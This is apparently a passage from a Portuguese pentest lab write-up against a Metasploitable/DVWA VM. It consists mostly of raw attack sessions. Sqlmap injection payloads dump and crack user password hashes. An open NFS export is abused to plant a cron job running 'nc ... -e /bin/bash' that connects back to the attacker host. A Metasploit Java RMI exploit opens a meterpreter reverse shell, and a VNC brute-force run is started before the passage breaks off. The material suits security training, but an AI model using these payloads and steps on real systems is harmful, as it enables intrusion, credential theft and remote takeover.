web application technology: Apache 2.2.8, PHP 5.2.4
back-end DBMS: MySQL >= 4.1
[02:22:41] [INFO] fetching database names
available databases [7]: # <----------
[*] dvwa # <----------
[*] information_schema # <----------
[*] metasploit # <----------
[*] mysql # <----------
[*] owasp10 # <----------
[*] tikiwiki # <----------
[*] tikiwiki195 # <----------

# Tivemos sucesso, tiramos um show databases... :D 

[02:22:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.11'

[*] ending @ 02:22:41 /2025-06-03/

                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=e64f45ec9240052e0f438a4fc1a59baf" --dbs
        ___
       __H__                                                                                                           
 ___ ___[)]_____ ___ ___  {1.9.2#stable}                                                                               
|_ -| . ["]     | .'| . |                                                                                              
|___|_  [']_|_|_|__,|  _|                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:23:23 /2025-06-03/

[02:23:23] [INFO] resuming back-end DBMS 'mysql' 
[02:23:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 9917=9917#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(1934,2866)>(SELECT COUNT(*),CONCAT(0x7162767871,(SELECT (ELT(1934=1934,1))),0x7162627671,FLOOR(RAND(0)*2))x FROM (SELECT 8090 UNION SELECT 2926 UNION SELECT 2133 UNION SELECT 9117)a GROUP BY x)-- befk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6718 FROM (SELECT(SLEEP(5)))EXzc)-- bvnd&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7162767871,0x4f557761426666524b4d5348766b79735652444b535a705371626545645162594578727a76656244,0x7162627671),NULL#&Submit=Submit
---
[02:23:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 4.1
[02:23:24] [INFO] fetching database names
available databases [7]:
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195

[02:23:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.11'

[*] ending @ 02:23:24 /2025-06-03/
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=e64f45ec9240052e0f438a4fc1a59baf" --dbs
        ___
       __H__                                                                                                           
 ___ ___[.]_____ ___ ___  {1.9.2#stable}                                                                               
|_ -| . ["]     | .'| . |                                                                                              
|___|_  [)]_|_|_|__,|  _|                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:23:30 /2025-06-03/

[02:23:31] [INFO] resuming back-end DBMS 'mysql' 
[02:23:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 9917=9917#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(1934,2866)>(SELECT COUNT(*),CONCAT(0x7162767871,(SELECT (ELT(1934=1934,1))),0x7162627671,FLOOR(RAND(0)*2))x FROM (SELECT 8090 UNION SELECT 2926 UNION SELECT 2133 UNION SELECT 9117)a GROUP BY x)-- befk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6718 FROM (SELECT(SLEEP(5)))EXzc)-- bvnd&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7162767871,0x4f557761426666524b4d5348766b79735652444b535a705371626545645162594578727a76656244,0x7162627671),NULL#&Submit=Submit
---
[02:23:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 4.1
[02:23:31] [INFO] fetching database names
available databases [7]:
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195

[02:23:31] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.11'

[*] ending @ 02:23:31 /2025-06-03/

                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=e64f45ec9240052e0f438a4fc1a59baf" -D dvwa --tables 
        ___
       __H__                                                                                                           
 ___ ___[.]_____ ___ ___  {1.9.2#stable}                                                                               
|_ -| . [,]     | .'| . |                                                                                              
|___|_  [']_|_|_|__,|  _|                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:25:07 /2025-06-03/

[02:25:08] [INFO] resuming back-end DBMS 'mysql' 
[02:25:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 9917=9917#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(1934,2866)>(SELECT COUNT(*),CONCAT(0x7162767871,(SELECT (ELT(1934=1934,1))),0x7162627671,FLOOR(RAND(0)*2))x FROM (SELECT 8090 UNION SELECT 2926 UNION SELECT 2133 UNION SELECT 9117)a GROUP BY x)-- befk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6718 FROM (SELECT(SLEEP(5)))EXzc)-- bvnd&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7162767871,0x4f557761426666524b4d5348766b79735652444b535a705371626545645162594578727a76656244,0x7162627671),NULL#&Submit=Submit
---
[02:25:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 4.1
[02:25:08] [INFO] fetching tables for database: 'dvwa'
[02:25:08] [WARNING] reflective value(s) found and filtering out
Database: dvwa    # <----------
[2 tables]
+-----------+     # <----------
| guestbook |     # <----------
| users     |     # <----------
+-----------+     # <----------

#mais sucesso, tiramos um show tables da base dvwa 

#----------------
[02:25:08] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.11'

[*] ending @ 02:25:08 /2025-06-03/
                                               
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=e64f45ec9240052e0f438a4fc1a59baf" -D dvwa -T users --columns
        ___
       __H__                                                                                                           
 ___ ___[,]_____ ___ ___  {1.9.2#stable}                                                                               
|_ -| . [.]     | .'| . |                                                                                              
|___|_  [.]_|_|_|__,|  _|                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:25:34 /2025-06-03/

[02:25:34] [INFO] resuming back-end DBMS 'mysql' 
[02:25:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 9917=9917#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(1934,2866)>(SELECT COUNT(*),CONCAT(0x7162767871,(SELECT (ELT(1934=1934,1))),0x7162627671,FLOOR(RAND(0)*2))x FROM (SELECT 8090 UNION SELECT 2926 UNION SELECT 2133 UNION SELECT 9117)a GROUP BY x)-- befk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6718 FROM (SELECT(SLEEP(5)))EXzc)-- bvnd&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7162767871,0x4f557761426666524b4d5348766b79735652444b535a705371626545645162594578727a76656244,0x7162627671),NULL#&Submit=Submit
---
[02:25:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 4.1
[02:25:34] [INFO] fetching columns for table 'users' in database 'dvwa'
[02:25:35] [WARNING] reflective value(s) found and filtering out 
Database: dvwam                  # <----------
Table: users                     # <----------
[6 columns]                      # <----------
+------------+-------------+     # <----------
| Column     | Type        |     # <----------
+------------+-------------+     # <----------
| user       | varchar(15) |     # <----------
| avatar     | varchar(70) |     # <----------
| first_name | varchar(15) |     # <----------
| last_name  | varchar(15) |     # <----------
| password   | varchar(32) |     # <----------
| user_id    | int(6)      |     # <----------
+------------+-------------+     # <----------

#mais sucesso, tiramos a tabela usuarios da database dvwan.. proximo passo é ver se achamos a senhas :D 


[02:25:35] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.11'

[*] ending @ 02:25:34 /2025-06-03/
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=e64f45ec9240052e0f438a4fc1a59baf" -D dvwa -T users -C user,password --dump 
        ___
       __H__                                                                                                           
 ___ ___[']_____ ___ ___  {1.9.2#stable}                                                                               
|_ -| . ["]     | .'| . |                                                                                              
|___|_  ["]_|_|_|__,|  _|                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:25:59 /2025-06-03/

[02:25:59] [INFO] resuming back-end DBMS 'mysql' 
[02:25:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 9917=9917#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(1934,2866)>(SELECT COUNT(*),CONCAT(0x7162767871,(SELECT (ELT(1934=1934,1))),0x7162627671,FLOOR(RAND(0)*2))x FROM (SELECT 8090 UNION SELECT 2926 UNION SELECT 2133 UNION SELECT 9117)a GROUP BY x)-- befk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6718 FROM (SELECT(SLEEP(5)))EXzc)-- bvnd&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7162767871,0x4f557761426666524b4d5348766b79735652444b535a705371626545645162594578727a76656244,0x7162627671),NULL#&Submit=Submit
---
[02:25:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: Apache 2.2.8, PHP 5.2.4
back-end DBMS: MySQL >= 4.1
[02:25:59] [INFO] fetching entries of column(s) '`user`,password' for table 'users' in database 'dvwa'
[02:26:00] [WARNING] reflective value(s) found and filtering out
[02:26:00] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[02:26:04] [INFO] writing hashes to a temporary file '/tmp/sqlmapq9qrca7j137935/sqlmaphashes-c9o25aez.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[02:26:12] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[02:26:15] [INFO] using default dictionary  
do you want to use common password suffixes? (slow!) [y/N] y
[02:26:18] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[02:26:18] [INFO] starting 2 processes 
[02:26:21] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03' #<----------              
[02:26:22] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b' #<----------                             
[02:26:30] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99' # <----------

[02:26:38] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7' #<----------

[02:26:48] [INFO] using suffix '1'                                                                                    
[02:27:18] [INFO] using suffix '123'                                                                                  
[02:27:30] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                               
[02:27:56] [INFO] using suffix '2'                                                                                    
[02:28:29] [INFO] using suffix '12'                                                                                   
[02:29:05] [INFO] using suffix '3'                                                                                    
[02:29:34] [INFO] using suffix '13'                                                                                   
[02:30:07] [INFO] using suffix '7'                                                                                    
[02:30:44] [INFO] using suffix '11'                                                                                   
[02:31:19] [INFO] using suffix '5'                                                                                    
[02:31:53] [INFO] using suffix '22'                                                                                   
[02:32:26] [INFO] using suffix '23'                                                                                   
[02:32:55] [INFO] using suffix '01'                                                                                   
[02:33:38] [INFO] using suffix '4'                                                                                    
[02:34:19] [INFO] using suffix '07'                                                                                   
[02:35:06] [INFO] using suffix '21'                                                                                   
[02:35:45] [INFO] using suffix '14'                                                                                   
[02:36:27] [INFO] using suffix '10'                                                                                   
[02:37:06] [INFO] using suffix '06'                                                                                   
[02:37:40] [INFO] using suffix '08'                                                                                   
[02:38:14] [INFO] using suffix '8'                                                                                    
[02:38:45] [INFO] using suffix '15'                                                                                   
[02:39:21] [INFO] using suffix '69'                                                                                   
[02:39:48] [INFO] using suffix '16'                                                                                   
[02:40:19] [INFO] using suffix '6'                                                                                    
[02:40:48] [INFO] using suffix '18'                                                                                   
[02:41:21] [INFO] using suffix '!'                                                                                    
[02:41:46] [INFO] using suffix '.'                                                                                    
[02:42:16] [INFO] using suffix '*'                                                                                    
[02:42:52] [INFO] using suffix '!!'                                                                                   
[02:43:37] [INFO] using suffix '?'                                                                                    
[02:44:21] [INFO] using suffix ';'                                                                                    
[02:44:46] [INFO] using suffix '..'                                                                                   
[02:45:14] [INFO] using suffix '!!!'                                                                                  
[02:45:41] [INFO] using suffix ', '                                                                                   
[02:46:06] [INFO] using suffix '@'                                                                                    
Database: dvwa                                                                                                        
Table: users # <----------
[5 entries] # <---------- SENHAS ---------
+---------+---------------------------------------------+# <----------
| user    | password                                    |# <----------
+---------+---------------------------------------------+# <----------
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |# <----------
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |# <----------
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |# <----------
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |# <----------
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |# <----------
+---------+---------------------------------------------+# <----------

[02:46:35] [INFO] table 'dvwa.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.100.11/dump/dvwa/users.csv'                                                                                                            
[02:46:35] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.11'

[*] ending @ 02:46:35 /2025-06-03/

                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 
```

---

#### Comandos utilizados no  SQLMAP

- Listar as tabelas do banco "dvwa"

Execute o seguinte comando:

```bash
sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=seu_cookie_aqui" \
-D dvwa --tables
```

O sqlmap retornara algo assim:

Tables:
- users
- guestbook
- ...

---
- Listar as colunas da tabela "users"

Use o comando abaixo para ver quais campos existem na tabela:

```bash
sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=seu_cookie_aqui" \
-D dvwa -T users --columns
```

Exemplo de retorno:

Columns:
- user_id
- first_name
- last_name
- user
- password
- avatar
----


- Extrair os dados da tabela "users"

Para visualizar os dados de colunas especificas como usuario e senha, use:

```bash
sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=seu_cookie_aqui" \
-D dvwa -T users -C user,password --dump
```

O comando acima vai mostrar todos os usuarios e senhas registrados no banco.


4. Dica adicional: uso de parametros extras

Para tornar o ataque mais eficaz, adicione:

--level=5 --risk=3 --batch

Exemplo completo:
```bash
sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=seu_cookie_aqui" \
--level=5 --risk=3 --batch \
-D dvwa -T users -C user,password --dump

#### DEPOIS DE MUITO TEMPO - 1Hs +- 

Table: users 
[5 entries] 
+---------+---------------------------------------------+# 
| user    | password                                    |# 
+---------+---------------------------------------------+# 
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |# 
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |# 
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |# 
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |# 
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |# 
+---------+---------------------------------------------+# 


```

5. Interpretando resultados

- A maioria das senhas estara em formato hash (md5, sha1, etc)
- Use ferramentas como hashcat, john ou sites como crackstation.net para tentar descriptografar os hashes
- Tente acessar o DVWA remotamente com os usuarios acima 



---

##  2. Ataque – Escalonamento via NFS

- **Serviço:** NFS (porta 2049)  
- **Ferramenta:** mount, bash  
- **CVE:** CVE-1999-0633  
- **Histórico:** Esta vulnerabilidade refere-se à exportação de diretórios NFS sem restrição de IP ou UID, permitindo que qualquer cliente remoto monte sistemas de arquivos e execute código arbitrário, inclusive como root. <br>
Obs.: nao é "bem" uma falha de NFS, mas, uma falha critica de configuração tb...

### Verificações:
```bash
nmap -p 2049 -sV --script=nfs-showmount 192.168.100.11
showmount -e 192.168.100.11
```

###  Bora lah:
```bash
mount -t nfs 192.168.100.11:/ /t2

┌──(kali㉿kali)-[/home/kali]
└─PS> df -h                                                                                                                     
Filesystem        Size  Used Avail Use% Mounted on
udev              1.9G     0  1.9G   0% /dev
tmpfs             393M  1.1M  392M   1% /run
/dev/sr0          4.6G  4.6G     0 100% /run/live/medium
/dev/loop0        3.9G  3.9G     0 100% /run/live/rootfs/filesystem.squashfs
tmpfs             2.0G  113M  1.9G   6% /run/live/overlay
overlay           2.0G  113M  1.9G   6% /
tmpfs             2.0G  4.0K  2.0G   1% /dev/shm
tmpfs             5.0M     0  5.0M   0% /run/lock
tmpfs             1.0M     0  1.0M   0% /run/credentials/systemd-journald.service
tmpfs             2.0G  5.8M  2.0G   1% /tmp
tmpfs             1.0M     0  1.0M   0% /run/credentials/getty@tty1.service
tmpfs             393M  136K  393M   1% /run/user/1000
192.168.100.11:/  7.0G  1.5G  5.2G  22% /home/kali/t2 #<------

/home/kali]
└─PS> ls t2                                                       
bin   cdrom  etc   initrd      lib         media  nohup.out  proc  sbin  sys  usr  vmlinuz
boot  dev    home  initrd.img  lost+found  mnt    opt        root  srv   tmp  var

┌──(kali㉿kali)-[/home/kali]
└─PS>                               
```

Ou seja acesso irrestrito ao hd, porem não foi um bug foi uma falha de configuração.. O que podemos fazer então ? Abrir um shell remoto ? 

Por default, tudo que é adiconado ao /etc/cron.d é adicionado ao agendado de tarefas e executado eventualmente. O que me diz de algo assim: 

```
echo "* * * * *  root nc 192.168.100.10 4444 -e /bin/bash" > /etc/cron.d/r
```
A cada minuto ele ira executar o nc para fazer um tunel remoto... Agora no host atacante: 
```
sudo nc -lvnp 4444                                                                                                        
listening on [any] 4444 ...

connect to [192.168.100.10] from (UNKNOWN) [192.168.100.11] 40179
ls 
Desktop
reset_logs.sh
vnc.log
ifconfig    

cd ..
cd etc
ls
X11
adduser.conf
adjtime
aliases
aliases.db
alternatives
apache2
apm
apparmor
apparmor.d

```
E é isso ae .... Bacana, não...
Agora pense... posso injetar uma chave ssh, posso alterar servicos... <br>

Muitas e diversas possibilidades...

---

## 3. Ataque – Java RMI Registry

- **Serviço:** Java RMI (porta 1099)  
- **Ferramenta:** Metasploit  
- **CVE:** CVE-2011-3556  
- **Histórico:** Essa falha de 2011 afeta aplicações Java que expõem interfaces RMI sem autenticação. Permitindo execução remota de código Java malicioso, ela foi uma das causas de múltiplos ataques corporativos ao longo da década.

###  Verificações:
```bash
nmap -p 1099 -sV 192.168.100.11
```

### Exploração:
```bash
msfconsole
use exploit/multi/misc/java_rmi_server
set RHOST 192.168.100.11
set RPORT 1099
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.100.10
run
```

````
### sao os mais simples ... so executar escript... :D 

┌──(kali㉿kali)-[/home/kali]
└─PS> nmap -p 1099 -sV 192.168.100.11                                                                                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 12:50 UTC
Nmap scan report for 192.168.100.11
Host is up (0.00032s latency).

PORT     STATE SERVICE  VERSION
1099/tcp open  java-rmi GNU Classpath grmiregistry
MAC Address: 08:00:27:56:5A:5B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds

┌──(kali㉿kali)-[/home/kali]
└─PS>                                                                                       

┌──(kali㉿kali)-[/home/kali]
└─PS> msfconsole                                                                                                                                                                                

Metasploit tip: Start commands with a space to avoid saving them to history
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __                                                                                                                                     
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                                                                                                                    
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                                                                                                                   
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                                                                                                                   
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                                                                                                                  
                                                                                                                                                                                                

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
msf6 > use exploit/multi/misc/java_rmi_server
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/misc/java_rmi_server) > set RHOST 192.168.100.11
RHOST => 192.168.100.11
msf6 exploit(multi/misc/java_rmi_server) > set RPORT 1099
RPORT => 1099
msf6 exploit(multi/misc/java_rmi_server) > set PAYLOAD java/meterpreter/reverse_tcp
PAYLOAD => java/meterpreter/reverse_tcp
msf6 exploit(multi/misc/java_rmi_server) > set LHOST 192.168.100.10
LHOST => 192.168.100.10
msf6 exploit(multi/misc/java_rmi_server) > run
[*] Started reverse TCP handler on 192.168.100.10:4444 
[*] 192.168.100.11:1099 - Using URL: http://192.168.100.10:8080/NtsmYTl1zDVUDA
[*] 192.168.100.11:1099 - Server started.
[*] 192.168.100.11:1099 - Sending RMI Header...
[*] 192.168.100.11:1099 - Sending RMI Call...
[*] 192.168.100.11:1099 - Replied to request for payload JAR
[*] Sending stage (58073 bytes) to 192.168.100.11
[*] Meterpreter session 1 opened (192.168.100.10:4444 -> 192.168.100.11:40338) at 2025-06-04 12:52:45 +0000

meterpreter > sysinfo
Computer        : metasploitable
OS              : Linux 2.6.24-16-server (i386)
Architecture    : x86
System Language : en_US
Meterpreter     : java/linux
meterpreter > ls
Listing: /
==========

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040666/rw-rw-rw-  4096     dir   2012-05-14 03:35:33 +0000  bin
040666/rw-rw-rw-  1024     dir   2012-05-14 03:36:28 +0000  boot
040666/rw-rw-rw-  4096     dir   2010-03-16 22:55:51 +0000  cdrom
040666/rw-rw-rw-  13480    dir   2025-06-03 11:30:17 +0000  dev
040666/rw-rw-rw-  4096     dir   2025-06-04 12:51:10 +0000  etc
040666/rw-rw-rw-  4096     dir   2010-04-16 06:16:02 +0000  home
040666/rw-rw-rw-  4096     dir   2010-03-16 22:57:40 +0000  initrd
100666/rw-rw-rw-  7929183  fil   2012-05-14 03:35:56 +0000  initrd.img
040666/rw-rw-rw-  4096     dir   2012-05-14 03:35:22 +0000  lib
040666/rw-rw-rw-  16384    dir   2010-03-16 22:55:15 +0000  lost+found
040666/rw-rw-rw-  4096     dir   2010-03-16 22:55:52 +0000  media
040666/rw-rw-rw-  4096     dir   2010-04-28 20:16:56 +0000  mnt
100666/rw-rw-rw-  9426     fil   2025-06-03 11:30:24 +0000  nohup.out
040666/rw-rw-rw-  4096     dir   2010-03-16 22:57:39 +0000  opt
040666/rw-rw-rw-  0        dir   2025-06-03 11:30:08 +0000  proc
040666/rw-rw-rw-  4096     dir   2025-06-03 11:30:24 +0000  root
040666/rw-rw-rw-  4096     dir   2012-05-14 01:54:53 +0000  sbin
040666/rw-rw-rw-  4096     dir   2010-03-16 22:57:38 +0000  srv
040666/rw-rw-rw-  0        dir   2025-06-03 11:30:09 +0000  sys
040666/rw-rw-rw-  4096     dir   2025-06-04 12:52:50 +0000  tmp
040666/rw-rw-rw-  4096     dir   2010-04-28 04:06:37 +0000  usr
040666/rw-rw-rw-  4096     dir   2010-03-17 14:08:23 +0000  var
100666/rw-rw-rw-  1987288  fil   2008-04-10 16:55:41 +0000  vmlinuz

meterpreter > 
meterpreter > 
meterpreter > ifconfig

Interface  1
============
Name         : lo - lo
Hardware MAC : 00:00:00:00:00:00
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ::


Interface  2
============
Name         : eth0 - eth0
Hardware MAC : 00:00:00:00:00:00
IPv4 Address : 192.168.100.11
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::a00:27ff:fe56:5a5b
IPv6 Netmask : ::

````

Bem tranquilinho... :D 

---

## 4. Ataque – VNC Login 

### VISÃO GERAL
- Nome do módulo: auxiliary/scanner/vnc/vnc_login
- Tipo: scanner de força bruta
- Objetivo: Tentar logins VNC usando listas de senhas comun
- Impacto: Acesso remoto à interface gráfica da máquina alvo

### COMO FUNCIONA

- O módulo tenta se conectar a um servidor VNC em uma ou mais portas (geralmente 5900).
- Tenta senhas de uma wordlist (ou senha definida por você).
- Se a senha estiver correta, o VNC retorna um hash de desafio válido, e o Metasploit reporta a senha como encontrada.
- Você pode, então, usar um cliente VNC (como vncviewer) para tomar o controle da tela do alvo.

### CENÁRIOS COMUNS DE USO

- Em ambientes com VNC exposto à internet ou LAN
- Em VMs mal configuradas (Metasploitable 2 tem o VNC vulnerável por padrão)
- Em testes internos onde a equipe esqueceu de mudar as senhas padrão

```
msf6 > 
msf6 > search auxiliary/scanner/vnc/vnc_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/vnc/vnc_login  .                normal  No     VNC Authentication Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/vnc/vnc_login

msf6 > set RHOST 192.168.100.11
RHOST => 192.168.100.11
msf6 > use auxiliary/scanner/vnc/vnc_login 
msf6 auxiliary(scanner/vnc/vnc_login) > 
msf6 auxiliary(scanner/vnc/vnc_login) > 
msf6 auxiliary(scanner/vnc/vnc_login) > 
msf6 auxiliary(scanner/vnc/vnc_login) > set RHOST 192.168.100.11
RHOST => 192.168.100.11
msf6 auxiliary(scanner/vnc/vnc_login) > 
msf6 auxiliary(scanner/vnc/vnc_login) > 
msf6 auxiliary(scanner/vnc/vnc_login) > run
